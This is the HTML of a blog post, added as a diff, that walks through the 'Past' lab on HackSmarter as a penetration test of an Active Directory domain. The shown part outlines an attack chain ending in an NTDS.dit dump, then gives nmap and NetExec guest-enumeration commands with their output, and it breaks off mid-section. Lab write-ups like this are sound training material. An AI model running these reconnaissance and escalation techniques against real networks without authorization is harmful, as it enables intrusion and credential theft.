@@ -1,0 +1,3087 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>Past — HackSmarter &middot; k40t1k</title>
+    <meta name="title" content="Past — HackSmarter &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="https://k40tik.github.io/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="https://k40tik.github.io/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="https://k40tik.github.io/posts/past-hacksmarter/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://k40tik.github.io/posts/past-hacksmarter/">
+	<meta property="og:site_name" content="k40t1k">
+	<meta property="og:title" content="Past — HackSmarter">
+	<meta property="og:description" content="My awesome website">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-08-10T17:00:00+03:00">
+		<meta property="article:modified_time" content="2026-08-10T17:00:00+03:00">
+		<meta property="article:tag" content="HackSmarter">
+		<meta property="article:tag" content="Active Directory">
+		<meta property="article:tag" content="Windows">
+		<meta property="article:tag" content="Medium">
+		<meta property="article:tag" content="TimeRoasting">
+		<meta property="article:tag" content="Hashcat">
+		<meta property="og:image" content="https://k40tik.github.io/posts/past-hacksmarter/feature.png">
+
+  
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="https://k40tik.github.io/posts/past-hacksmarter/feature.png">
+	<meta name="twitter:title" content="Past — HackSmarter">
+	<meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Past — HackSmarter",
+    "headline": "Past — HackSmarter",
+    
+    
+    "inLanguage": "en",
+    "url" : "https:\/\/k40tik.github.io\/posts\/past-hacksmarter\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-08-10T17:00:00\u002b03:00",
+    "datePublished": "2026-08-10T17:00:00\u002b03:00",
+    
+    "dateModified": "2026-08-10T17:00:00\u002b03:00",
+    
+    "keywords": ["HackSmarter","Active Directory","Windows","Medium","TimeRoasting","Hashcat","SYSVOL","BloodHound","GenericAll","Resource-Based Constrained Delegation","Kerberos","DCSync","NTDS.dit","WinRM","Privilege Escalation","CTF Writeup"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1535"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "https://k40tik.github.io/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "https://k40tik.github.io/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Past — Hack Smarter",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Writeups</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certificates/"
+                  title="Certificates"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certificates</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Past — HackSmarter
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-08-10 17:00:00 &#43;0300 EAT">10 August 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/feature_hu_2d16f04101819f26.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/feature_hu_98aa643f8aed0b37.webp 660w
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/feature_hu_7e9129f5e77e4858.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/past-hacksmarter/feature_hu_bd49b809c678e3b6.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1600"
+        height="912"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/feature_hu_8cda07258cc0bee0.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/feature_hu_332c58e9b6a3c0ed.png 330w,https://k40tik.github.io/posts/past-hacksmarter/feature_hu_8cda07258cc0bee0.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/feature_hu_8063977d75800b43.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/feature_hu_a011796083e98e3a.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#objective">Objective</a>
+      <ul>
+        <li><a href="#initial-access">Initial Access</a></li>
+        <li><a href="#author">Author</a></li>
+      </ul>
+    </li>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-reconnaissance-and-enumeration">Step 1: Reconnaissance and Enumeration</a>
+      <ul>
+        <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+        <li><a href="#user-enumeration">User Enumeration</a></li>
+        <li><a href="#accessing-the-share">Accessing the Share</a></li>
+        <li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+        <li><a href="#timeroasting">TimeRoasting</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-2-initial-access">Step 2: Initial Access</a>
+      <ul>
+        <li><a href="#password-spraying">Password Spraying</a></li>
+        <li><a href="#sysvol-share">SYSVOL Share</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-3-internal-enumeration-with-bloodhound">Step 3: Internal Enumeration with BloodHound</a></li>
+    <li><a href="#step-4-bypassing-the-login-restriction">Step 4: Bypassing the Login Restriction</a></li>
+    <li><a href="#step-5-privilege-escalation-via-resource-based-constrained-delegation">Step 5: Privilege Escalation via Resource-Based Constrained Delegation</a>
+      <ul>
+        <li><a href="#step-1-create-a-controlled-machine-account">Step 1: Create a Controlled Machine Account</a></li>
+        <li><a href="#step-2-grant-rbcd-on-the-target-to-the-controlled-machine">Step 2: Grant RBCD on the Target to the Controlled Machine</a></li>
+        <li><a href="#step-3-get-a-tgt-for-the-new-controlled-computer">Step 3: Get a TGT for the New Controlled Computer</a></li>
+        <li><a href="#step-4-impersonate-the-administrator">Step 4: Impersonate the Administrator</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-6-domain-compromise">Step 6: Domain Compromise</a></li>
+    <li><a href="#step-7-finding-ryans-password">Step 7: Finding Ryan&rsquo;s Password</a></li>
+    <li><a href="#resources">Resources</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="objective" class="relative group">Objective <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#objective" aria-label="Anchor">#</a></span></h2><blockquote>
+<p>You have been hired by Hack Smarter to perform a Penetration Test on Past Systems Inc. During your call with the client, they stated they are currently adding new machines to the network.</p>
+</blockquote>
+<h3 id="initial-access" class="relative group">Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-access" aria-label="Anchor">#</a></span></h3><p>The client has provided you with VPN access to their internal network, but no credentials.</p>
+<h3 id="author" class="relative group">Author <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#author" aria-label="Anchor">#</a></span></h3><ul>
+<li><a href="https://www.linkedin.com/in/ryan-yager-442a4964/" target="_blank" rel="noreferrer">Ryan Yager</a></li>
+</ul>
+<h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>This writeup covers the full attack path taken against the <code>past.local</code> Active Directory environment of Past Systems Inc. Starting with nothing but VPN access and a set of found usernames, the chain involved SMB enumeration with the guest account, a TimeRoasting attack to crack a machine account password, credential discovery in the SYSVOL scripts folder, a Kerberos ticket-based login restriction bypass, and abuse of a <strong>GenericAll</strong> object control to perform a Resource-Based Constrained Delegation (RBCD) attack. The final outcome was a Domain Admin ticket, an NTDS.dit dump, and administrative WinRM access.</p>
+<p><strong>Key Findings:</strong></p>
+<ul>
+<li><strong>Domain:</strong> <code>past.local</code> (DC: <code>EC2AMAZ-A5O4OL8.past.local</code>, Windows Server 2016)</li>
+<li><strong>Initial foothold:</strong> Machine account password recovered via TimeRoasting and Hashcat</li>
+<li><strong>Credentials leak:</strong> Plaintext credentials for <code>tyler</code> stored in the SYSVOL scripts folder</li>
+<li><strong>Login restriction bypass:</strong> Kerberos ticket authentication bypassed <code>tyler</code>&rsquo;s logon restrictions</li>
+<li><strong>Domain compromise:</strong> GenericAll abuse chained into an RBCD attack to impersonate <code>Administrator</code> and dump NTDS.dit</li>
+</ul>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>The assessment began with a full port scan against the target IP (10.1.162.214) to identify running services.</p>
+<pre tabindex="0"><code>nmap -sV -sC -p- 10.1.162.214
+</code></pre><pre tabindex="0"><code>PORT      STATE SERVICE       REASON          VERSION
+88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-09 09:06:54Z)
+135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: past.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  syn-ack ttl 126 Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: PAST)
+464/tcp   open  kpasswd5?     syn-ack ttl 126
+593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 126
+3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: PAST
+|   NetBIOS_Domain_Name: PAST
+|   NetBIOS_Computer_Name: EC2AMAZ-A5O4OL8
+|   DNS_Domain_Name: past.local
+|   DNS_Computer_Name: EC2AMAZ-A5O4OL8.past.local
+|   DNS_Tree_Name: past.local
+|   Product_Version: 10.0.14393
+|_  System_Time: 2026-08-09T09:08:09+00:00
+5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+49668/tcp open  unknown       syn-ack ttl 126
+49673/tcp open  unknown       syn-ack ttl 126
+49674/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  unknown       syn-ack ttl 126
+49681/tcp open  unknown       syn-ack ttl 126
+49696/tcp open  unknown       syn-ack ttl 126
+49705/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+</code></pre><p><strong>Key Findings:</strong></p>
+<ul>
+<li>The host is a domain controller running Windows Server 2016, identified as <code>EC2AMAZ-A5O4OL8.past.local</code>.</li>
+<li>Standard Active Directory services are present: Kerberos (88), LDAP (389/636), SMB (139/445), RDP (3389), and WinRM (5985).</li>
+<li>The domain was identified as <code>past.local</code> with the NetBIOS name <code>PAST</code>.</li>
+<li>No web server or SQL service was exposed, meaning the attack surface is limited to AD and SMB.</li>
+</ul>
+<h3 id="smb-enumeration" class="relative group">SMB Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#smb-enumeration" aria-label="Anchor">#</a></span></h3><p>I began with SMB enumeration using NetExec and anonymous access.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum_hu_e5881535cd5d45a9.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum_hu_36eb966321405b6c.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum_hu_59e1120d3154ff5c.webp 934w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum_hu_59e1120d3154ff5c.webp 934w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="934"
+        height="104"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum_hu_9948ca593551936.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum_hu_967f8b25f5e6538a.png 330w,https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum_hu_9948ca593551936.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum.png 934w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/nxc-smb-anon-enum.png 934w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Attempting to list the shares without valid credentials failed.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail_hu_3a4969fb9e130afd.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail_hu_311324c8e6df0847.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail_hu_7d22bfcb108a4819.webp 970w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail_hu_7d22bfcb108a4819.webp 970w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="970"
+        height="103"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail_hu_85e9c42b1d22d78b.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail_hu_2fc51ef8f1528cf7.png 330w,https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail_hu_85e9c42b1d22d78b.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail.png 970w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/share-listing-fail.png 970w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I also tried user enumeration via <code>rpcclient</code>, but it failed because the tool requires credentials.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/past-hacksmarter/rpcclient-user-enum-fail_hu_443b0c89b262c268.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="619"
+        height="101"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/rpcclient-user-enum-fail.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>As a next step, I tried to perform a share listing using the guest account with an empty password, which successfully enumerated the shares.</p>
+<pre tabindex="0"><code>nxc smb 10.1.162.214 -u guest -p &#39;&#39; --shares
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing_hu_f2843d16db7e5f95.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing_hu_741095a993656ac4.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing_hu_fa793b27bac06a50.webp 947w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing_hu_fa793b27bac06a50.webp 947w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="947"
+        height="222"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing_hu_d94fde767d270b36.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing_hu_d462330f46abe61e.png 330w,https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing_hu_d94fde767d270b36.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing.png 947w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/guest-share-listing.png 947w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The guest user has read access on a non-standard share.</p>
+<h3 id="user-enumeration" class="relative group">User Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#user-enumeration" aria-label="Anchor">#</a></span></h3><p>Since the guest account was usable, I performed user enumeration over SMB.</p>
+<pre tabindex="0"><code>nxc smb 10.1.162.214 -u guest -p &#39;&#39; --users
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/user-enumeration_hu_3a80d1b9eb174def.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/user-enumeration_hu_aec173f8d81975ca.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/user-enumeration_hu_75dee7e6a5cee947.webp 978w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/user-enumeration_hu_75dee7e6a5cee947.webp 978w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="978"
+        height="81"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/user-enumeration_hu_3b084ac5b977e5ea.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/user-enumeration_hu_6d18310cdda07934.png 330w,https://k40tik.github.io/posts/past-hacksmarter/user-enumeration_hu_3b084ac5b977e5ea.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/user-enumeration.png 978w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/user-enumeration.png 978w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I also ran a RID brute-force to enumerate all objects in the domain.</p>
+<pre tabindex="0"><code>nxc smb 10.1.162.214 -u guest -p &#39;&#39; --rid-brute
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/rid-brute_hu_4d5bf850c6821c76.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/rid-brute_hu_fae8f9ffc9264879.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/rid-brute_hu_444a707430f11a.webp 963w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/rid-brute_hu_444a707430f11a.webp 963w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="963"
+        height="407"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/rid-brute_hu_ac19c43029163521.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/rid-brute_hu_47d16872da8f9dba.png 330w,https://k40tik.github.io/posts/past-hacksmarter/rid-brute_hu_ac19c43029163521.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/rid-brute.png 963w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/rid-brute.png 963w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I filtered the results for user SIDs to isolate the actual user accounts from the well-known domain groups.</p>
+<pre tabindex="0"><code>nxc smb 10.1.162.214 -u guest -p &#39;&#39; --rid-brute | grep &#39;SidTypeUser&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users_hu_c1a66cd0f4d2c4e7.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users_hu_db6912ae0db1a98c.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users_hu_caf4f05995e5065c.webp 956w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users_hu_caf4f05995e5065c.webp 956w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="956"
+        height="167"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users_hu_eca44810403a266a.png" srcset="https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users_hu_fbcb5b9103b606c.png 330w,https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users_hu_eca44810403a266a.png 660w
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users.png 956w
+          
+          
+            ,https://k40tik.github.io/posts/past-hacksmarter/rid-brute-users.png 956w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="accessing-the-share" class="relative group">Accessing the Share <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#accessing-the-share" aria-label="Anchor">#</a></span></h3><p>Using the guest account, I accessed the non-standard share that had been discovered.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/past-hacksmarter/guest-share-access_hu_e58e357beb41898.webp 330w,https://k40tik.github.io/posts/past-hacksmarter/guest-share-access_hu_b618437aa0c0715e.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/guest-share-access_hu_83b6fd1e85c5b364.webp 738w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/past-hacksmarter/guest-share-access_hu_83b6fd1e85c5b364.webp 738w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="738"
+        height="182"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
